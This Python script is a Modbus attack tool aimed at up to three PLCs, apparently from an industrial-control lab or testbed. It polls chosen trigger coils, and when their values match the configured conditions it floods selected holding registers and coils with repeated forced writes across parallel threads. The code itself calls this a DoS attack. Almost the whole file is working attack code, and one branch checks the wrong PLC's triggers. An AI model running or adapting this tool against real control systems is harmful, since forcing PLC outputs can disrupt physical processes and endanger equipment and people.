import sys
import threading
import configparser

from pymodbus.client.tcp import ModbusTcpClient

# global variable that indicates the DoS attack has started
attack_started = False


def perform_register_attack(client, address, value, packets):
    print("Writing " + str(value) + " to register %QX0." + str(address))
    count = 0
    while count < packets:
        resp = client.write_register(address, value)
        count += 1
        if resp.isError():
            print("ERROR writing register %QX0." + str(address), file=sys.stderr)
    print("Attack to register %QX0." + str(address) + " completed.")


def perform_coil_attack(client, address, value, packets):
    print("Writing " + str(value) + " to coil %QX0." + str(address))
    count = 0
    while count < packets:
        resp = client.write_coil(address, value)
        count += 1
        if resp.isError():
            print("ERROR writing coil %QX0." + str(address), file=sys.stderr)
    print("Attack to coil %QX0." + str(address) + " completed.")


def attack(ctx):
    #
    # reading attack configuration...
    prefs = {}
    attack_config = (configparser.ConfigParser())
    attack_config.read("attack_config.ini")
    attack_config.sections()

    prefs["packets"] = attack_config["general"]["packet_number"]
    prefs["value"] = attack_config["general"]["packet_value"]

    use_plc1 = attack_config["plc1"]["use"] == 'True'
    use_plc2 = attack_config["plc2"]["use"] == 'True'
    use_plc3 = attack_config["plc3"]["use"] == 'True'

    # check if PLC1, PLC2 and PLC3 should be attacked, and in case read the attack configuration
    if use_plc1:
        prefs["plc1"] = {}
        prefs["plc1"]["registers"] = attack_config["plc1"]["registers"].replace(' ', '').split(',') \
            if attack_config["plc1"]["registers"] != '' else []
        prefs["plc1"]["coils"] = attack_config["plc1"]["coils"].replace(' ', '').split(',') \
            if attack_config["plc1"]["coils"] != '' else []
        tr1 = attack_config["plc1"]["triggers"].replace(' ', '').split(',')
        prefs["plc1"]["triggers"] = [x.split('=') for x in tr1] if tr1 != [''] else []

    if use_plc2:
        prefs["plc2"] = {}
        prefs["plc2"]["registers"] = attack_config["plc2"]["registers"].replace(' ', '').split(',') \
            if attack_config["plc2"]["registers"] != '' else []
        prefs["plc2"]["coils"] = attack_config["plc2"]["coils"].replace(' ', '').split(',') \
            if attack_config["plc2"]["coils"] != '' else []
        tr2 = attack_config["plc2"]["triggers"].replace(' ', '').split(',')
        prefs["plc2"]["triggers"] = [x.split('=') for x in tr2] if tr2 != [''] else []

    if use_plc3:
        prefs["plc3"] = {}
        prefs["plc3"]["registers"] = attack_config["plc3"]["registers"].replace(' ', '').split(',') \
            if attack_config["plc3"]["registers"] != '' else []
        prefs["plc3"]["coils"] = attack_config["plc3"]["coils"].replace(' ', '').split(',') \
            if attack_config["plc3"]["coils"] != '' else []
        tr3 = attack_config["plc3"]["triggers"].replace(' ', '').split(',')
        prefs["plc3"]["triggers"] = [x.split('=') for x in tr3] if tr3 != [''] else []

    print("CONFIG: " + str(prefs))

    #
    # retrieve registers, coils and triggers from PLCs
    registers_to_attack = {}
    coils_to_attack = {}
    triggers_register = {}
    if "plc1" in prefs:
        for reg in prefs["plc1"]["registers"]:
            registers_to_attack[reg] = ctx.register("plc1", 'H', int(reg[4:]))
        for coil in prefs["plc1"]["coils"]:
            coils_to_attack[coil] = ctx.register("plc1", 'C', int(coil[4:]))
            if coil in [x[0] for x in prefs["plc1"]["triggers"]]:
                triggers_register[coil] = coils_to_attack[coil]
        for trig in prefs["plc1"]["triggers"]:
            if not trig[0] in triggers_register.keys():
                triggers_register[trig[0]] = ctx.register("plc1", 'C', int(trig[0][4:]))

    if "plc2" in prefs:
        for reg in prefs["plc2"]["registers"]:
            registers_to_attack[reg] = ctx.register("plc2", 'H', int(reg[4:]))
        for coil in prefs["plc2"]["coils"]:
            coils_to_attack[coil] = ctx.register("plc2", 'C', int(coil[4:]))
            if coil in [x[0] for x in prefs["plc2"]["triggers"]]:
                triggers_register[coil] = coils_to_attack[coil]
        for trig in prefs["plc2"]["triggers"]:
            if not trig[0] in triggers_register.keys():
                triggers_register[trig[0]] = ctx.register("plc2", 'C', int(trig[0][4:]))

    if "plc3" in prefs:
        for reg in prefs["plc3"]["registers"]:
            registers_to_attack[reg] = ctx.register("plc3", 'H', int(reg[4:]))
        for coil in prefs["plc3"]["coils"]:
            coils_to_attack[coil] = ctx.register("plc3", 'C', int(coil[4:]))
            if coil in [x[0] for x in prefs["plc3"]["triggers"]]:
                triggers_register[coil] = coils_to_attack[coil]
        for trig in prefs["plc3"]["triggers"]:
            if not trig[0] in triggers_register.keys():
                triggers_register[trig[0]] = ctx.register("plc3", 'C', int(trig[0][4:]))

    print("TARGET REGISTERS: " + str(list(registers_to_attack.keys())))
    print("TARGET COILS: " + str(list(coils_to_attack.keys())))

    #
    # listener that occurs when a register value changes
    def on_value_change(value: int):
        global attack_started

        # in case attack has already started, it stops the polling!
        if attack_started:
            for c in triggers_register.values():
                c.stop_polling()
            return

        #
        # check if the system is triggered by retrieving all PLCs values from 'trigger' list
        triggered = True
        client1 = None
        client2 = None
        client3 = None
        config = configparser.ConfigParser()
        config.read('config.ini')
        if "plc1" in prefs:
            hp1 = config['plc']['plc1'].split(":")
            client1 = ModbusTcpClient(hp1[0], int(hp1[1]))
            client1.connect()
            for tt in prefs["plc1"]["triggers"]:
                print("Checking value of coil %QX0." + tt[0][4:])
                response = client1.read_coils(int(tt[0][4:]))
                coil_val = 1 if response.bits[0] else 0
                print("Value is " + str(coil_val))
                triggered = triggered and coil_val == int(tt[1])

        if "plc2" in prefs:
            hp2 = config['plc']['plc2'].split(":")
            client2 = ModbusTcpClient(hp2[0], int(hp2[1]))
            client2.connect()
            for tt in prefs["plc2"]["triggers"]:
                print("Checking value of coil %QX0." + tt[0][4:])
                response = client2.read_coils(int(tt[0][4:]))
                coil_val = 1 if response.bits[0] else 0
                print("Value is " + str(coil_val))
                triggered = triggered and coil_val == int(tt[1])

        if "plc3" in prefs:
            hp3 = config['plc']['plc3'].split(":")
            client3 = ModbusTcpClient(hp3[0], int(hp3[1]))
            client3.connect()
            for tt in prefs["plc2"]["triggers"]:
                print("Checking value of coil %QX0." + tt[0][4:])
                response = client3.read_coils(int(tt[0][4:]))
                coil_val = 1 if response.bits[0] else 0
                print("Value is " + str(coil_val))
                triggered = triggered and coil_val == int(tt[1])

        #
        # attack if the all the conditions are satisfied
        if triggered:
            attack_started = True
            n_pack = int(prefs["packets"])
            value = int(prefs["value"]) == 1
            print("Start attack...")
            if client1 is not None:
                for target in prefs["plc1"]["registers"]:
                    proc_r = threading.Thread(target=perform_register_attack,
                                              args=(client1, int(target[4:]), value, n_pack))
                    proc_r.start()
                for target in prefs["plc1"]["coils"]:
                    proc_c = threading.Thread(target=perform_coil_attack,
                                              args=(client1, int(target[4:]), value, n_pack))
                    proc_c.start()

            if client2 is not None:
                for target in prefs["plc2"]["registers"]:
                    proc_r = threading.Thread(target=perform_register_attack,
                                              args=(client2, int(target[4:]), value, n_pack))
                    proc_r.start()
                for target in prefs["plc2"]["coils"]:
                    proc_c = threading.Thread(target=perform_coil_attack,
                                              args=(client2, int(target[4:]), value, n_pack))
                    proc_c.start()

            if client3 is not None:
                for target in prefs["plc3"]["registers"]:
                    proc_r = threading.Thread(target=perform_register_attack,
                                              args=(client3, int(target[4:]), value, n_pack))
                    proc_r.start()
                for target in prefs["plc3"]["coils"]:
                    proc_c = threading.Thread(target=perform_coil_attack,
                                              args=(client3, int(target[4:]), value, n_pack))
                    proc_c.start()
        else:
            print("Waiting for a trigger....")

    #
    # start the polling of each coil involved in the triggering
    for reg in triggers_register.values():
        reg.start_polling(100, on_value_change)
